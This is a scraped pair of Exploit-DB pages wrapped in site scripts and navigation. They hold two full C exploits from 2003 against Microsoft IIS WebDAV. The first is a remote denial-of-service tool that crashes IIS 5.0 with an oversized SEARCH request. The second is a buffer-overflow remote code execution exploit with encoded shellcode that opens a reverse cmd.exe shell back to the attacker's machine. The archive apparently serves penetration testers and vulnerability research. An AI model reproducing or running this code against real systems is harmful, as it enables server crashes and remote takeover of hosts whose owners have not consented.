to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 35
Microsoft IIS 5.0 < 5.1 - Remote Denial of Service - Windows dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft IIS 5.0 < 5.1 - Remote Denial of ServiceEDB-ID:35CVE:2003-0226EDB Verified:Author:ShachankType:dosExploit:/Platform:WindowsDate:2003-05-31Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*Microsoft IIS versions 5.0 and 5.1 remote denial of service exploitthat makes use of the vulnerability recently published by SPI dynamicsPublished on 31.05.2003*/#include <windows.h>#include <winsock.h>#include <stdio.h>#pragma comment (lib,"ws2_32")void graphitte(){printf("\n********************************** ");printf("\n   Webdav MICROSOFT IIS DoS Exploit     * \n");printf("+++++++++++++++++++++++++++++++*\n");printf(" by Shachank Pandrey                                *\n");printf("*************************************\n");}char *funk(char tobesent[100],char *host){int s; char got[100];WSADATA wsaData;struct hostent *yo;struct sockaddr_in heck;char lala[100];if(WSAStartup(0x0101,&wsaData)!=0) {printf("error starting winsock..");return 0;}if ((yo = gethostbyname(host))==0){printf("error: can't resolve '%s'",host);return 0;}heck.sin_port = htons(80);heck.sin_family = AF_INET;heck.sin_addr = *((struct in_addr *)yo->h_addr);if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1){printf("Error: Unable to create socket");}if ((connect(s, (struct sockaddr *) &heck, sizeof(heck))) == -1){printf("Error: Cudn't Connect\r\n");}memset(lala,0,sizeof(lala));sprintf(lala,"%s",tobesent,sizeof(tobesent));send(s,lala,strlen(lala),0);recv(s,got,100,0);return got;closesocket(s);WSACleanup();printf("done.\n");}int main(int argc, char *argv[]){WSADATA wsaData;int s;char mysend[100];char *gotme;char trash[100];struct hostent *yo;struct sockaddr_in heck;char buffer[65535] ="";char myrequest[80000];char content[] ="<?xml version=\"1.0\"?>\r\n""<g:searchrequest xmlns:g=\"DAV:\">\r\n""<g:sql>\r\n""Select \"DAV:displayname\" from scope()\r\n""</g:sql>\r\n""</g:searchrequest>\r\n";graphitte();if(WSAStartup(0x0101,&wsaData)!=0) {printf("Error :Cudn't initiate winsock!");return 0;}if(argc<2){printf("\nUsage : %s <I.P./Hostname>\n\n",argv[0]);exit(0);}if ( (yo = gethostbyname(argv[1]))==0){printf("error: can't resolve '%s'",argv[1]);return 1;}printf("\nChecking web server %s\n",argv[1]);gotme=(char *)funk("GET / HTTP/1.0\r\n\n",argv[1]);if (strstr(gotme,"IIS/5.0") == NULL){ printf("\n\r----> %s is not running IIS 5.0! adios !\n",argv[1]); }else{printf("\n\r----> Aww rite! IIS 5.0 found on %s !\n",argv[1]);sprintf(mysend,"SEARCH / HTTP/1.0\r\n\n",40);gotme=(char *)funk(mysend,argv[1]);if (strstr(gotme,"HTTP/1.1 411 Length Required") != NULL){ printf("\n\r----> METHOD SEARCH ALLOWED\r\n"); }else{printf("\n----> Method SEARCH not Allowed ! adios...\n");exit(0);}heck.sin_port = htons(80);heck.sin_family = AF_INET;heck.sin_addr = *((struct in_addr *)yo->h_addr);if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1){printf("error: can't create socket");return 1;}if ((connect(s, (struct sockaddr *) &heck, sizeof(heck))) == -1){printf("Error:Cudn't Connect\r\n");return 1;}buffer[sizeof(buffer)]=0x00;memset(buffer,'S',sizeof(buffer));memset(myrequest,0,sizeof(myrequest));memset(trash,0,sizeof(trash));sprintf(myrequest,"SEARCH /%s HTTP/1.1\r\nHost: %s\r\nContent-type: text/xml\r\nContent-Length: ",buffer,argv[1]);sprintf(myrequest,"%s%d\r\n\r\n",myrequest,strlen(content));printf("\r\nDoSsing the server...<pray>\n");send(s,myrequest,strlen(myrequest),0);send(s,content,strlen(content),0);recv(s,trash,sizeof(trash),0);if(trash[0]==0x00){printf("Server is DoSsed! Now run !! F-B-eyee is after j00...\r\n");}elseprintf("Server is prolly patched.\r\n");closesocket(s);}WSACleanup();return 1;}// milw0rm.com [2003-05-31]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 36
Microsoft Windows - WebDAV Remote Code Execution (2) - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows - WebDAV Remote Code Execution (2)EDB-ID:36CVE:2003-0109EDB Verified:Author:alumniType:remoteExploit:/Platform:WindowsDate:2003-06-01Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*//*	    29/05/2003 - by Alumni -                   *//*              Microsoft IIS WebDAV New Exploit           *//*                 spawns shell on port 32768                 *//*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/#include <stdio.h>#include <winsock.h>#include <windows.h>#define SHELLCODELEN	753#define NOP				0x90#define BUFFERLEN		1024#define RET				0x41424344#define GMHOFF	30#define GPAOFF	38#define IPOFF	161#define DEFPORT	32768//#define DEBUGGEE_FLOW	// for debug only#ifdef DEBUGGEE_FLOW#define GMH		(long)GetModuleHandle#define GPA		(long)GetProcAddress#else#define GMH		0x0100107C	// GetModuleHandle@#define GPA		0x01001034	// GetProcAddress@#endif#define XOROFF	11#define SOFF	16char prologue[] ="\xEB\x03"	// jmp $+3"\x58"		// pop eax"\x50"		// push eax"\xC3"		// retn"\xE8\xF8\xFF\xFF\xFF"	// call $-3"\xB2"		// mov dl, %key"\x90"		// %key"\x33\xC9"	// xor ecx, ecx"\x66\xB9"	// mov cx, shellcodesize"\x04\x03"	// shellcodesize = hex(SHELLCODELEN)"\x04\x14"	// add al, 0x14"\x30\x10"	// xor byte ptr[eax], dl"\x40"		// inc eax"\x66\x49"	// dec cx"\x67\xE3\x02"	// jcxz $+5"\xEB\xF6"	// jmp $-8;char shellcode[SHELLCODELEN+1] ="\xe8\x5f\x02\x00\x00\x8b\xe8\x33\xf6\x66\xbe\x80""\x00\x03\xf4\xc7\x46\xf0\x00\x00\x00\x00\xc7\x46""\xf4\x00\x00\x00\x00\xb8\xf2\x12\x40\x00\x89\x46""\xf8\xb8\xf8\x12\x40\x00\x89\x46\xfc\x8b\xd5\x81""\xc2\x9e\x02\x00\x00\x52\xff\x56\xf8\x89\x46\xf4""\x8b\xd5\x81\xc2\xab\x02\x00\x00\x52\xff\x76\xf4""\xff\x56\xfc\x68\x00\x10\x00\x00\x6a\x40\xff\xd0""\x8b\xf8\x8b\xc7\x8b\xfe\x8b\xf0\x83\xc6\x20\x8b""\x47\xf8\x89\x46\xf8\x8b\x47\xf4\x89\x46\xf4\x8b""\x47\xfc\x89\x46\xfc\x8b\xd5\x81\xc2\x6e\x02\x00""\x00\x52\xff\x56\xf8\x89\x46\xf0\x8b\xd5\x81\xc2""\x7e\x02\x00\x00\x52\xff\x76\xf0\xff\x56\xfc\x8b""\xd8\x6a\x06\x6a\x01\x6a\x02\xff\xd3\x89\x06\x8b""\xd6\x83\xc2\x14\xb8""\x7f\x00\x00\x01"		// put your ip here (run netcat before,e.g. 127.0.0.1)"\x89\x42\x04\x66\xc7\x02\x02\x00\x66\xb8""\x80\x00"			// specify connectious port here (e.g.32768)"\x66\x89\x42""\x02\x8b\xd5\x81\xc2\x8a\x02\x00\x00\x52\xff\x76""\xf0\xff\x56\xfc\x8b\xd8\x6a\x10\x8b\xd6\x83\xc2""\x14\x52\xff\x36\xff\xd3\x83\xf8\xff\x0f\x84\x84""\x01\x00\x00\x8b\xd5\x81\xc2\x79\x02\x00\x00\x52""\xff\x76\xf0\xff\x56\xfc\x8b\xd8\x8b\xd6\x6a\x00""\x68\x64\x0f\x00\x00\x81\xc2\x9c\x00\x00\x00\x52""\xff\x36\xff\xd3\xc6\x84\x30\x9c\x00\x00\x00\x00""\xbb\x00\x00\x00\x00\x66\xb9\x0c\x00\x8a\x84\x2b""\x62\x02\x00\x00\x88\x84\x33\x90\x00\x00\x00\x43""\x66\x49\x66\x83\xf9\x00\x75\xe9\x8b\xfe\x81\xc7""\x84\x00\x00\x00\xc7\x07\x0c\x00\x00\x00\xc7\x47""\x04\x00\x00\x00\x00\xc7\x47\x08\x01\x00\x00\x00""\x8b\xfe\x8b\xd6\x8b\xce\x81\xc7\x84\x00\x00\x00""\x83\xc2\x0c\x83\xc1\x10\x6a\x00\x57\x51\x52\x8b""\xd5\x81\xc2\xc9\x02\x00\x00\x52\xff\x76\xf4\xff""\x56\xfc\x8b\xd8\xff\xd3\x8b\xfe\x83\xc7\x34\xc7""\x07\x44\x00\x00\x00\x66\xc7\x47\x30\x00\x00\xc7""\x47\x2c\x01\x01\x00\x00\x8b\x46\x10\x89\x47\x3c""\x89\x47\x40\x8b\xd6\x8b\xde\x8b\xce\x81\xc2\x90""\x00\x00\x00\x83\xc3\x34\x83\xc1\x78\x51\x53\x6a""\x00\x6a\x00\x6a\x00\x6a\x01\x6a\x00\x6a\x00\x52""\x6a\x00\x8b\xd5\x81\xc2\xd4\x02\x00\x00\x52\xff""\x76\xf4\xff\x56\xfc\x8b\xd8\xff\xd3\x8b\xd5\x81""\xc2\xbd\x02\x00\x00\x52\xff\x76\xf4\xff\x56\xfc""\x8b\xd8\xff\x76\x10\xff\xd3\x8b\xd6\x83\xc2\x08""\x8b\xd5\x81\xc2\xb7\x02\x00\x00\x52\xff\x76\xf4""\xff\x56\xfc\x8b\xd8\x68\x88\x13\x00\x00\xff\xd3""\x8b\xd6\x8b\xce\x81\xc2\x90\x00\x00\x00\x83\xc1""\x08\x8b\x5e\x08\x6a\x00\x51\x68\x70\x0f\x00\x00""\x52\xff\x76\x0c\x8b\xd5\x81\xc2\xe3\x02\x00\x00""\x52\xff\x76\xf4\xff\x56\xfc\x8b\xd8\xff\xd3\x8b""\xd6\x81\xc2\x90\x00\x00\x00\x6a\x00\xff\x76\x08""\x52\xff\x36\x8b\xd5\x81\xc2\x85\x02\x00\x00\x52""\xff\x76\xf0\xff\x56\xfc\x8b\xd8\xff\xd3\x8b\xd5""\x81\xc2\x92\x02\x00\x00\x52\xff\x76\xf0\xff\x56""\xfc\x8b\xd8\xff\x36\xff\xd3\xe9\x1c\xfe\xff\xff""\x58\x50\xc3\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f""\x43\x20\x20\x57\x53\x32\x5f\x33\x32\x2e\x44\x4c""\x4c\x00\x72\x65\x63\x76\x00\x73\x6f\x63\x6b\x65""\x74\x00\x73\x65\x6e\x64\x00\x63\x6f\x6e\x6e\x65""\x63\x74\x00\x63\x6c\x6f\x73\x65\x73\x6f\x63\x6b""\x65\x74\x00\x4b\x45\x52\x4e\x45\x4c\x33\x32\x2e""\x44\x4c\x4c\x00\x47\x6c\x6f\x62\x61\x6c\x41\x6c""\x6c\x6f\x63\x00\x53\x6c\x65\x65\x70\x00\x43\x6c""\x6f\x73\x65\x48\x61\x6e\x64\x6c\x65\x00\x43\x72""\x65\x61\x74\x65\x50\x69\x70\x65\x00\x43\x72\x65""\x61\x74\x65\x50\x72\x6f\x63\x65\x73\x73\x41\x00""\x52\x65\x61\x64\x46\x69\x6c\x65\x00";char xmlbody[] ="<?xml version=\"1.0\"?>\r\n<g:searchrequestxmlns:g=\"DAV:\">\r\n""<g:sql>\r\nSelect \"DAV:displayname\"from scope()\r\n</g:sql>\r\n</g:searchrequest>\r\n";long retaddr, buffsize;char* buffer;unsigned long getlocalhostip(){char buff[128];in_addr inaddr;if(!gethostname(buff,128)){memcpy(&inaddr,gethostbyname(buff)->h_addr,4);return(inet_addr(inet_ntoa(inaddr)));}return (-1);}ULONG WINAPI AcceptThread(LPVOID lpParam){int ln1;unsigned long slisten, sacc;sockaddr_in saddrin;slisten = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);if (slisten!=INVALID_SOCKET){saddrin.sin_addr.s_addr = INADDR_ANY;saddrin.sin_family = AF_INET;saddrin.sin_port = htons(DEFPORT);bind(slisten,(struct sockaddr*)&saddrin,sizeof(saddrin));listen(slisten,5);while (1){ln1 = sizeof(saddrin);sacc = accept(slisten,(struct sockaddr*)&saddrin,&ln1);if (sacc!=INVALID_SOCKET){printf("\n\nShell succesfully spawned onremote host\nNetcat to %d",DEFPORT);ExitProcess(0);}}}return (1);}ULONG SendRequest (char* sHost, int iPort){char* buffsend;struct sockaddr_in saddr_in;int timeout;unsigned long sock;buffsend = (char*)malloc(buffsize+256);memset(buffsend,0,buffsize+256);sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);saddr_in.sin_addr.s_addr = inet_addr(sHost);saddr_in.sin_family = AF_INET;saddr_in.sin_port = htons(iPort);if (!connect(sock,(struct sockaddr*)&saddr_in,sizeof(saddr_in))){timeout = 5000;setsockopt(sock,SOL_SOCKET,SO_RCVTIMEO,(char*)&timeout,sizeof(timeout));setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,(char*)&timeout,sizeof(timeout));sprintf(buffsend,"SEARCH / HTTP/1.1\r\nHost:%s\r\nContent-Type: text/xml\r\nContent-Length: %d\r\n\r\n%s%s",strlen(xmlbody)+strlen(buffer),xmlbody,buffer);send (sock,buffsend,strlen(buffsend),0);closesocket(sock);}else return(1);return (0);}void dispUsage(char* str1){printf ("IIS WebDAV exploit by Alumni - The Matrix Reloaded -\n");printf ("Usage: %s <ipv4dot> <port> [<buffsize>] [<retaddr>]\n\n",str1);return;}int main(int argc, char** argv){unsigned long uThread;int prologuelen = 0, i;char xorkey = 0;long *ptr1;WSADATA wsadata;WSAStartup(MAKEWORD(2,0),&wsadata);buffsize = BUFFERLEN;retaddr = RET;#ifndef DEBUGGEE_FLOWif (argc<3){dispUsage(argv[0]);return (1);}if (argc>=4) buffsize = atoi(argv[3]);if (argc>=5) retaddr = atol(argv[4]);#endifbuffer = (char*) malloc(buffsize+1);ptr1 = (long*)buffer;memset(buffer,0,buffsize);CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)AcceptThread,NULL,NULL,&uThread);*(long*)(shellcode+GMHOFF) = GMH;*(long*)(shellcode+GPAOFF) = GPA;*(long*)(shellcode+IPOFF) = getlocalhostip();for (i=0;i<256;i++){int iBool = 1, j;for (j=0;j<SHELLCODELEN;j++)if ((shellcode[j]^i)==0 || (shellcode[j]^i)==0x0d|| (shellcode[j]^i)==0x0a) iBool = 0;if (iBool){xorkey = i;break;}}for (i=0;i<SHELLCODELEN;i++) shellcode[i] ^= xorkey;for (i=0;i<(buffsize-SHELLCODELEN)/2;i++) buffer[i] = NOP;prologue[XOROFF] = xorkey;*(short int*)(prologue+SOFF) = SHELLCODELEN;strncat(buffer,prologue,buffsize);prologuelen = strlen(buffer);for (i=prologuelen;i<SHELLCODELEN+prologuelen;i++) buffer[i] =shellcode[i-prologuelen];prologuelen = strlen(buffer);buffer[prologuelen] = NOP;buffer[prologuelen+1] = NOP;buffer[prologuelen+2] = NOP;buffer[prologuelen+3] = NOP;for (i=(prologuelen+3) & (~3);i<buffsize;i+=sizeof(retaddr))  *(long*)(buffer+i) = retaddr;buffer[buffsize] = 0;printf ("%s",buffer);#ifdef DEBUGGEE_FLOW__asm {mov eax, ptr1call eax}#elseSendRequest(argv[1],atoi(argv[2]));#endifWSACleanup();return (0);}// milw0rm.com [2003-06-01]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit 